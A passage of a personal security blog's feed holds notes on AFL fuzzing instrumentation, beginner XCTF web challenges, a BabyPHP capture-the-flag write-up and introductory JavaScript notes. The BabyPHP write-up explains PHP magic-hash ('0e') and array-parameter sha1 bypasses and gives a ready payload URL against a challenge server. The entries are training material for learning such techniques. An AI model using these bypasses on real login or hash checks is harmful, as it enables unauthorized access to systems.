&quot;leal 16(%%esp), %%esp\n&quot;</span><br><span class="line">&gt;   &quot;\n&quot;</span><br><span class="line">&gt;   &quot;/* --- END --- */\n&quot;</span><br><span class="line">&gt;   &quot;\n&quot;;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>​    上面的汇编代码主要做了一下几个工作：</p><ul><li><p>保存 edi 等寄存器</p></li><li><p>将 ecx  的值设置为 fprintf() 所要打印的变量（key）内容</p></li><li><p>调用方法__afl_maybe_log()</p></li><li><p>恢复寄存器</p></li></ul><p><img src="/images/80-7.jpg" alt></p></blockquote><h4 id="font-color-navy3实现代码插桩的途径font"><a class="markdownIt-Anchor" href="#font-color-navy3实现代码插桩的途径font"></a> <font color="navy">3.实现代码插桩的途径</font></h4><blockquote><p>（1）它可以通过<strong>插入汇编代码</strong>直接在每个分支点周围用汇编来扩充二进制文件。</p><p>（2）它可以使用<strong>模拟器（QEMU）捕获无法重新编译</strong>的二进制文件的跟踪信息。</p><p>（3）它可以通过在<strong>LLVM中添加传递并添加汇编语言</strong>以“原则”方式执行操作。通过LLVM的方法（3）的一个优点是LLVM可以产生非常干净的中间表示（称为bitcode）</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-什么是-aflfont&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-什么是-aflfont&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、什么是 AFL
      
    
    </summary>
    
    
      <category term="二进制" scheme="https://muzibing.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="fuzz" scheme="https://muzibing.github.io/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>XCTF 新人阶段 — web</title>
    <link href="https://muzibing.github.io/2019/09/02/2019.09.02%EF%BC%8879%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/09/02/2019.09.02（79）/</id>
    <published>2019-09-01T16:00:00.000Z</published>
    <updated>2019-09-07T10:30:44.626Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Today I mainly write some notes about the web topic of the XCTF newcomer stage.The following is a list of topics.</p><ol><li>view source</li><li>get post</li><li>robots</li><li>backup</li><li>cookie</li><li>disabled button</li><li>simple js</li><li>xff referer</li><li>weak auth</li><li>webshell</li><li>command execution</li><li>simple php</li></ol></blockquote><blockquote><p>In order to make the knowledge points involved in each topic as clear as possible.I only summarize the knowledge points of the first two topics.</p></blockquote><h3 id="font-color-brown一-view-sourcefont"><a class="markdownIt-Anchor" href="#font-color-brown一-view-sourcefont"></a> <font color="brown">一、view source</font></h3><h4 id="font-color-navy1-question-requirmentfont"><a class="markdownIt-Anchor" href="#font-color-navy1-question-requirmentfont"></a> <font color="navy">1. Question requirment</font></h4><p><img src="/images/79-1.png" alt></p><h4 id="font-color-navy2basic-knowledgefont"><a class="markdownIt-Anchor" href="#font-color-navy2basic-knowledgefont"></a> <font color="navy">2.Basic knowledge</font></h4><blockquote><p>what is the role of browser F12?</p><ul><li><p><font color="blue"><strong>Elements</strong></font></p><p>It is used  to view  or modify the attributes of HTML elements ,CSS properties,listen events,breakpoints,and more.</p></li><li><p><font color="blue"><strong>Console</strong></font></p><p>The console is typically used to <em>execute</em> one-time code,view JavaScript objects,and view debug log information or <em>exception</em> information.</p></li><li><p><font color="blue"><strong>Sources</strong></font></p><p>The page is used to view the HTML source code of the current web page,JavaScript source code,CSS source code,and most importantly,you can debug(调试) the JavaScript source code,add breakpoints to the JS code and so on.</p></li><li><p><font color="blue"><strong>Network</strong></font></p><p>Network page is mainly used to view information related to the network connection such as the header.</p><p><img src="/images/79-2.png" alt></p><ul><li><strong>Header</strong>:The panel lists the resource request url,HTTP method,response status code,request header and response header and their respective values,request parameter,etc.</li><li><strong>Preview</strong>:View panel to view resource</li><li><strong>Response</strong>:The response information panel contains content that has not been formatted by resource</li><li><strong>Timing</strong>:The details of the resource request take time.</li></ul></li></ul></blockquote><h4 id="font-color-navy3problem-solving-stepfont"><a class="markdownIt-Anchor" href="#font-color-navy3problem-solving-stepfont"></a> <font color="navy">3.Problem solving  step</font></h4><blockquote><p>Press f12 button and we can view the flag on the Elements page.</p><p><img src="/images/79-3.png" alt></p></blockquote><h3 id="font-color-brwon二-post_getfont"><a class="markdownIt-Anchor" href="#font-color-brwon二-post_getfont"></a> <font color="brwon">二、post_get</font></h3><h4 id="font-color-navy1question-requirementfont"><a class="markdownIt-Anchor" href="#font-color-navy1question-requirementfont"></a> <font color="navy">1.Question Requirement</font></h4><p><img src="/images/79-4.png" alt></p><h4 id="font-color-navy2basic-knowledgefont-2"><a class="markdownIt-Anchor" href="#font-color-navy2basic-knowledgefont-2"></a> <font color="navy">2.Basic knowledge</font></h4><blockquote><p>◉ First,there are some difference between post and get.</p><p>    Because someone has done a good summary of the two requests,I can’t summarize them here.<a href="https://www.zhihu.com/question/28586791" target="_blank" rel="noopener">Click here to learn more.</a></p></blockquote><h4 id="font-color-navy3problem-solving-stepfont-2"><a class="markdownIt-Anchor" href="#font-color-navy3problem-solving-stepfont-2"></a> <font color="navy">3.Problem Solving step</font></h4><blockquote><p>◉ The first step:</p><p>    Open the URL in the question and find that we are required to submit a variable named “a” with a value of 1 by GET method.</p><p><img src="/images/79-5.png" alt></p><p>◉ The second step:</p><p>    I constructed “?a=1” in the GET request line by <a href="http://BurpSuit.As" target="_blank" rel="noopener">BurpSuit.As</a> shown following the picture:</p><p><img src="/images/79-6.png" alt></p><p>◉ The third step:</p><p>    In the previous step,we will send the constructed command to the server and we will get the following page:</p><p><img src="/images/79-7.png" alt></p><p>◉ The fourth step:</p><p>    The step requires us to submit a variable named “b” with a value of 2 by POST method.Here,we need to use a tool named “HackBar”.We can do the work by it.</p><p><img src="/images/79-8.png" alt></p><p>◉ The last step:</p><p>    In the step,we can get the flag about the problm.</p><p><img src="/images/79-9.png" alt></p></blockquote><p>​</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Today I mainly write some notes about the web topic of the XCTF newcomer stage.The following is a list of topics.&lt;/p&gt;
&lt;ol&gt;
&lt;
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
  </entry>
  
  <entry>
    <title>BabyPHP 解题总结</title>
    <link href="https://muzibing.github.io/2019/08/01/2019.08.01%EF%BC%8878%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/08/01/2019.08.01（78）/</id>
    <published>2019-07-31T16:00:00.000Z</published>
    <updated>2019-09-07T10:30:53.673Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-php-部分漏洞font"><a class="markdownIt-Anchor" href="#font-color-brown一-php-部分漏洞font"></a> <font color="brown">一、PHP 部分漏洞</font></h3><h4 id="font-color-navy1_get-和-_postfont"><a class="markdownIt-Anchor" href="#font-color-navy1_get-和-_postfont"></a> <font color="navy">1.$_GET 和 $_POST</font></h4><blockquote><p>如果 GET 参数中设置 <code>name[]=a</code>，那么 <code>$_GET['name'] = [a]</code>，php 会把 <code>[]=a</code> 当成数组传入， <code>$_GET</code> 会自动对参数调用 <code>urldecode</code>。</p><p><code>$_POST</code> 同样存在此漏洞，提交的表单数据，<code>user[]=admin</code>，<code>$_POST['user']</code> 得到的是 <code>['admin']</code> 是一个数组。</p></blockquote><h4 id="font-color-navy2sha1-和-md5-函数font"><a class="markdownIt-Anchor" href="#font-color-navy2sha1-和-md5-函数font"></a> <font color="navy">2.sha1 和 md5 函数</font></h4><blockquote><p>PHP在处理哈希字符串时，<strong>会利用 ”!=” 或 ”==” 来对哈希值进行比较</strong>，它把每一个以 “0E” 开头的哈希值都解释为 <strong>0</strong>，所以<font color="red">如果两个不同的密码经过哈希以后，其哈希值都是以 “0E” 开头的，那么PHP将会认为它们都是 <strong>0</strong></font>。</p><p>MD5不能处理数组，若有以下判断则可用数组<strong>绕过</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">if</span>(@md5($_GET[<span class="string">'a'</span>]) == @md5($_GET[<span class="string">'b'</span>]))</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;     <span class="keyword">echo</span> <span class="string">"yes"</span>;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="font-color-navy3-符号font"><a class="markdownIt-Anchor" href="#font-color-navy3-符号font"></a> <font color="navy">3.&quot; === &quot; 符号</font></h4><blockquote><p>在数学计算中我们习惯的用 “a = b”，表示的意思是 a 的值与 b 的值相等，而在计算机世界中这样的说法是完全错误的，在计算机的计算中</p><ul><li>“ <strong>a = b</strong> ”：表示的意思是将 b 的值赋值给 a；</li><li>“ <strong>a == b</strong> ”：表示的意思是判断 a 的值与 b 的值是否相等；</li><li>“ <strong>a === b</strong> ”：表示的意思是 a 的<strong>类型</strong>以及<strong>相应的值</strong>与 b 的<strong>类型</strong>以及<strong>相应的值</strong>是否相等，如果返回 1，则表示，a 与 b 是同类型同值关系；</li></ul></blockquote><h3 id="font-color-brown二-分析题目font"><a class="markdownIt-Anchor" href="#font-color-brown二-分析题目font"></a> <font color="brown">二、分析题目</font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">    &lt;title&gt;Exercise&lt;/title&gt; </span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;h1&gt;PHP&apos;s basic feature&lt;/h1&gt;&lt;!--好吧其实是老套路了--&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">require_once(&apos;flag.php&apos;); </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;]) &amp;&amp; isset($_GET[&apos;test&apos;]))&#123; </span><br><span class="line">    // ========== Stage 1 ==========  </span><br><span class="line">    $test=$_GET[&apos;test&apos;];  </span><br><span class="line">    $test=md5($test);  </span><br><span class="line"></span><br><span class="line">    if($test==&apos;0&apos;) &#123;  </span><br><span class="line">        print &apos;You passed stage 1.&lt;br /&gt;&apos;; </span><br><span class="line">    &#125; </span><br><span class="line">    else&#123; </span><br><span class="line">        print &quot;Game over at stage 1.&quot;;  </span><br><span class="line">        exit(); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    // ========== Stage 2 ==========  </span><br><span class="line">    if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;])&#123; </span><br><span class="line">        print &apos;Your password can not be your name.&apos;; </span><br><span class="line">        exit(); </span><br><span class="line">    &#125; </span><br><span class="line">    else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;]))&#123; </span><br><span class="line">        print &apos;You passed stage 2.&lt;br /&gt;&apos;; </span><br><span class="line">        print &apos;Flag: &apos;.$flag; </span><br><span class="line">    &#125; </span><br><span class="line">    else&#123; </span><br><span class="line">        print &apos;Invalid password&apos;; </span><br><span class="line">        exit(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">echo &apos;&lt;hr /&gt;&apos;; </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">?&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h4 id="font-color-navy1stage-1-分析font"><a class="markdownIt-Anchor" href="#font-color-navy1stage-1-分析font"></a> <font color="navy">1.stage 1 分析</font></h4><blockquote><p>如上面的代码所示，需要输入三个参数：name、password 和 test，对 stage 1 代码分析：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$test=$_GET[<span class="string">'test'</span>];  </span><br><span class="line">$test=md5($test);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($test == <span class="string">'0'</span>) &#123;  </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'You passed stage 1.&lt;br /&gt;'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Game over at stage 1."</span>;  </span><br><span class="line">    <span class="keyword">exit</span>(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>对输入的 test 值进行 md5 加密，使得加密后的结果等于 0 ，这样就可以通过 stage 1，那么我们在解题时需要做的就是如何使得 test 加密后的结果等于 0 呢？</p></blockquote><h4 id="font-color-navy2stage-2-分析font"><a class="markdownIt-Anchor" href="#font-color-navy2stage-2-分析font"></a> <font color="navy">2.stage 2 分析</font></h4><blockquote><p>在分析了 stage 1 后，我们再继续对 stage 2 的代码进行分析：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])&#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Your password can not be your name.'</span>; </span><br><span class="line">    <span class="keyword">exit</span>(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))&#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'You passed stage 2.&lt;br /&gt;'</span>; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Flag: '</span>.$flag; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Invalid password'</span>; </span><br><span class="line">    <span class="keyword">exit</span>(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>首先要使得输入的 name 和 password 的值不相等，然后将输入的 name 和 password 对应的值分别进行 sha1 进行加密 ，使得加密后的结果是“<strong>同类型同值</strong>”的。在分析了 stage 2 后，我们后面需要做的工作有两个：</p><ul><li>分别找到一个 name 和 password 的值，这两个值不能相等，并对这两个进行 md5 加密，使得结果是同类型同值的 ；</li></ul><p>如果上述的方法不能实现，那么我们再根据 PHP 的漏洞进行攻击。</p></blockquote><h3 id="font-color-brown三-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-brown三-解题步骤font"></a> <font color="brown">三、解题步骤</font></h3><h4 id="font-color-navy1找出-test-的值font"><a class="markdownIt-Anchor" href="#font-color-navy1找出-test-的值font"></a> <font color="navy">1.找出 test 的值</font></h4><blockquote><p>在 BabyXSS 题目中，我们曾经写过一个是关于求通过输入数据，数据经过 md5 加密并匹配给定的字符串的脚本，那么我们将那个程序直接拿过来用，把给定的字符串替换为 0 ，我们尝试求一下解，果然我们得到了一个数值：27，但是将 test = 27 放到 URL 中，结果是错误的。</p><br><p>那么我们再换个思维去思考这个问题，在 PHP 漏洞的总结中可以知道，<code>PHP在处理哈希字符串时，会利用 ”!=” 或 ”==” 来对哈希值进行比较，它把每一个以 “0E” 开头的哈希值都解释为 0，所以如果两个不同的密码经过哈希以后，其哈希值都是以 “0E” 开头的，那么PHP将会认为它们都是 0。</code>那么我们只需要找到加密后的结果是以 <strong>0E</strong> 开头的原文就可以了，那么经过尝试我们得出以下几个原文和密文：</p><ul><li>QNKCDZO ——&gt; 0e830400451993494058024219903391</li><li>PJNPDWY ——&gt; 0e291529052894702774557631701704</li><li>NWWKITQ ——&gt; 0e763082070976038347657360817689</li><li>NOOPCJF ——&gt; 0e818888003657176127862245791911</li><li>MMHUWUV ——&gt; 0e701732711630150438129209816536</li><li>MAUXXQC ——&gt; 0e478478466848439040434801845361</li><li>IHKFRNS ——&gt; 0e256160682445802696926137988570</li><li>GZECLQZ ——&gt; 0e537612333747236407713628225676</li></ul><p>我们只需要选择其中的一个就可以，在这里我们选择 “<strong>QNKCDZO</strong>” 进行尝试得到下图的结果：</p><p><img src="/images/1564657630.jpg" alt></p></blockquote><h4 id="font-color-navy2求-name-和-passwordfont"><a class="markdownIt-Anchor" href="#font-color-navy2求-name-和-passwordfont"></a> <font color="navy">2.求 name 和 password</font></h4><blockquote><p>下面我们要求 name 和 password 的值了，在这里需要提的一个就是 sha1 碰撞，通过这种碰撞是可以找出两个数的 sha1 值相等的，但是花的时间和精力就相对大些，那我们是不是也可以通过 PHP 的漏洞，绕过 sha1 使得满足 if 条件呢？</p><br><p>答案是肯定的，在 PHP 漏洞总结中，我们有一个是关于 sha1 的，<code>sha1([]) 和 md5([]) 处理数组不会报错，直接返回false</code>，那么我们可以通过使 name 和 password 为数组类型，sha1 对数组处理后返回 null 绕过 “===” 。</p><p><br>现在我们使 <font color="red"><strong>name[]=0&amp;password[]=2</strong></font>，这个时候能够成功的满足<code>if ($_GET['name'] == $_GET['password'])</code>不相等，在<code>else if (sha1($_GET['name']) === sha1($_GET['password']))</code>的条件中，sha1 对 name 和 password 的数组类型无法理解都返回 <code>null</code>，也就使得 null === null ，所以也就满足第二个条件。</p></blockquote><h4 id="font-color-navy3提交构造的-payload获取-flagfont"><a class="markdownIt-Anchor" href="#font-color-navy3提交构造的-payload获取-flagfont"></a> <font color="navy">3.提交构造的 payload，获取 flag</font></h4><blockquote><p>经过以上两步的分析，我们可以得到三个参数的值，那么下面我们构造一下 payload ：</p><center><font color="red">http://123.207.149.64:23331/feature/?test=QNKCDZO&password[]=2&name[]=0</font></center>我们可以从服务器得到 flag：<p><img src="/images/1564661617(1).png" alt></p></blockquote><p><img src="https://www.canva.cn/learn/wp-content/uploads/sites/17/2019/07/%E5%BB%BA%E5%86%9B%E8%8A%82%E7%BA%AA%E5%BF%B5%E6%97%A5%E2%94%82%E4%B8%BA%E5%86%9B%E5%93%A5%E5%93%A5%E6%89%93call%E7%9A%84%E7%AC%AC92%E5%B9%B422.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-php-部分漏洞font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-php-部分漏洞font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、PHP 部
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="PHP" scheme="https://muzibing.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript 学习笔记（一）</title>
    <link href="https://muzibing.github.io/2019/07/31/2019.07.31%EF%BC%8877%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/07/31/2019.07.31（77）/</id>
    <published>2019-07-30T16:00:00.000Z</published>
    <updated>2019-07-31T11:47:41.983Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-js-简介font"><a class="markdownIt-Anchor" href="#font-color-brown一-js-简介font"></a> <font color="brown">一、JS 简介</font></h3><blockquote><p>getElementById() 是多个 JavaScript HTML 方法之一</p><ol><li><p><strong>JavaScript 能够改变 HTML 的内容</strong>：</p><p><font color="navy">document.getElementById(“demo”).innerHTML = “Hello JavaScript”;</font></p></li><li><p><strong>JavaScript 能够改变 HTML 属性</strong>：</p><p><font color="navy">document.getElementById(“demo”).src =</font></p></li><li><p><strong>JavaScript 能够改变 HTML 样式 (CSS)</strong>:</p><p><font color="navy">document.getElementById(“demo”).style.fontSize=&quot;&quot;</font></p></li><li><p><strong>JavaScript 能够隐藏 HTML元素</strong>:</p><p><font color="navy">document.getElementById(“demo”).style.display=‘none’</font></p></li><li><p><strong>JavaScript 能够显示 HTML 元素</strong>:</p><p><font color="navy">document.getElementById(“demo”).style.display=“block”</font></p></li></ol></blockquote><h3 id="font-color-brown二-js-使用font"><a class="markdownIt-Anchor" href="#font-color-brown二-js-使用font"></a> <font color="brown">二、JS 使用</font></h3><blockquote><h4 id="font-color-navy1-script标签font"><a class="markdownIt-Anchor" href="#font-color-navy1-script标签font"></a> <font color="navy">1. &lt;script&gt;标签</font></h4><p>      在 HTML 中，JavaScript 代码必须位于 &lt;script&gt; 与 &lt;/script&gt; 标签之间.</p><h4 id="font-color-navy2javascript-函数和事件font"><a class="markdownIt-Anchor" href="#font-color-navy2javascript-函数和事件font"></a> <font color="navy">2.JavaScript 函数和事件</font></h4><p>      JavaScript 函数是一种 JavaScript 代码块，它可以在调用时被执行。例如，当发生事件时调用函数，比如当用户点击按钮时。</p><h4 id="font-color-navy3-head-或-body-中的-javascriptfont"><a class="markdownIt-Anchor" href="#font-color-navy3-head-或-body-中的-javascriptfont"></a> <font color="navy">3. &lt;head&gt; 或 &lt;body&gt; 中的 JavaScript</font></h4><ul><li><p>&lt;head&gt;中的 JavaScript</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">&gt;   <span class="function"><span class="keyword">function</span> <span class="title">myFunction</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">&gt;       <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = <span class="string">"段落被更改。"</span>;</span></span><br><span class="line"><span class="undefined">&gt;   &#125;</span></span><br><span class="line"><span class="undefined">&gt;   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">h1</span>&gt;</span>一张网页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span>一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"myFunction()"</span>&gt;</span>试一试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></blockquote><blockquote><ul><li><p>&lt;body&gt; 中的 JavaScript</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">h1</span>&gt;</span>A Web Page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span>一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"myFunction()"</span>&gt;</span>试一试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">&gt;   <span class="function"><span class="keyword">function</span> <span class="title">myFunction</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">&gt;      <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = <span class="string">"段落被更改。"</span>;</span></span><br><span class="line"><span class="undefined">&gt;   &#125;</span></span><br><span class="line"><span class="undefined">&gt;   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;   <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">h1</span>&gt;</span>A Web Page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span>一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"myFunction()"</span>&gt;</span>试一试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">&gt;   <span class="function"><span class="keyword">function</span> <span class="title">myFunction</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">&gt;      <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = <span class="string">"段落被更改。"</span>;</span></span><br><span class="line"><span class="undefined">&gt;   &#125;</span></span><br><span class="line"><span class="undefined">&gt;   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></blockquote><blockquote><p><strong>注意</strong>：把脚本置于 <strong>&lt;body&gt;</strong> 元素的底部，可改善显示速度，因为脚本编译会拖慢显示</p><h4 id="font-color-navy4外部脚本font"><a class="markdownIt-Anchor" href="#font-color-navy4外部脚本font"></a> <font color="navy">4.外部脚本</font></h4><ul><li><p>外部文件：myScript.js</p><p>外部脚本很实用，如果相同的脚本被用于许多不同的网页。JavaScript 文件的文件扩展名是 <strong>.js</strong>。如需使用外部脚本，请在&lt;scripT&gt; 标签的 src (source) 属性中设置脚本的名称</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 